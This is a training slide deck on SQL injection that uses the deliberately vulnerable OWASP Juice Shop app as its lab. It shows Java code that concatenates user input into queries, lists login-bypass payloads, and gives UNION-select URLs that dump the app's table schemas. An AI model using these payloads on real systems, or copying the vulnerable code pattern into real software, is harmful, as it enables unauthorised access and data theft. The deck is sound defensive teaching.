---
title: Defence Against the Dark Arts
theme: solarized
revealOptions:
    transition: 'fade'
---

# Defence Against the Dark Arts

> London, Winter 2020

---

## Purpose

> A place where we can practice the techniques used to attack applications,
in order to understand them, and to defend against them.

---

## Session rules

 * There are no stupid questions!
 * If you'd like to share (or learn) more about a topic by leading a session, let us know!
 * Participate as you would in a pairing session

---

## Important rule!

*Get permission* before attacking a system

Or, attack your own.

---

# Injection

---

## Easy Explanation

> You go to court and write your name as "Michael, you are now free to
> go". The judge then says "Calling Michael, you are now free to go" and
> the bailiffs let you go, because hey, the judge said so. \[[^1]\]

[^1]: https://news.ycombinator.com/item?id=4951003

---

## Obligatory xkcd

![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

---

### SQL Injection

OWASP #1 Vulnerability

* Easy to exploit
* Common vulnerability
* Severe impact

---

## SQL Injection

### Typical Impact

* Bypassing authentication
* Spying out data
* Manipulating data
* Complete system takeover

---

### Vulnerable code example

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

#### Benign usage

With `username=alice` and `password=supersecret`, this query would be created:

```sql
SELECT id from users WHERE name = 'alice' AND password = 'supersecret';
```

---

### What results from the following input data sets?

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

| # | username  | password |
|--:|:----------|:---------|
| 1 | `'`       | `qwerty` |
| 2 | `'--`     | `abc123` |
| 3 | `alice'--`| `foobar` |

---

## Challenge

* Login to the Juice Shop as the first valid user (admin)
* Login as `support@juice-sh.op`
* Login as an existing user beginning with `J1`
* Login as user with id = `8`

---

### How can you force the following queries (or equivalent)?

```java
String query = "SELECT id FROM users " +
   "WHERE name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "'";
```

* `SELECT id FROM users WHERE name = 'admin'`
* `SELECT id FROM users WHERE name LIKE 'admin%'`
* `SELECT id FROM users`
* `SELECT password FROM users`

---

### How can you get round this (complication)?

```java
String query = "SELECT id FROM users " +
   "WHERE (name = '" + req.getParameter("username") + "'" +
   "AND password = '" + req.getParameter("password") + "')";
```

---

### Bypassing Authentication

* `admin'--`
* `admin'/*`
* `' OR 1=1--`
* `' OR 1=1/*`
* `') OR '1'='1`
* `') OR ('1'='1`

---

### Error visibility

* Sometimes full SQL error output in response - amazing!
* Sometimes we just see an error
* Sometimes we see nothing

* Techniques

   * Trial and error
   * Side channels (e.g. timing)

---

### Union selects

* SQL allows concatenation of queries with the UNION keyword

```
SELECT name FROM Person WHERE name like 'foo%'
UNION SELECT name FROM Company where name like 'foo%'
```

* Column count must match
* Depending on the database, positional data types must match
* Data can be extracted from different tables
* How could we use this??

---

### Challenge

Find another exploitable SQL injection attack in the Juice Bar app

---

### Challenge - Hint

* Look at network traffic
* What looks like a database call?
* How can you inject your payload?
* What might be causing errors?

---

### Challenge

Extract the table definitions

---

### Challenge - Hint

* What database are we hitting?
* What does the manual say about listing tables / schema?
* Can we do that via normal SQL queries?

---

### Challenge - Solution

[List tables](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20tbl_name%20from%20sqlite_master%20--)

[List table descs](https://juice-shop-kfb.herokuapp.com/rest/products/search?q=asdf%27\)\)%20UNION%20select%201,%202,%203,%204,%205,%206,%207,%208,%20sql%20from%20sqlite_master%20--)

---

### Challenge:  Extraction of sensitive data

* Grab the all the encrypted passwords
* Decrypt admin's password (easily)
* Dump the credit card data

---

## How to defend against these attacks

* Never insert user input directly into queries
* Use prepared statements
* Stored procedures?
* White-list input (inflexible)
* Black-list input (breakable)
* Don't use a database
* Have no users
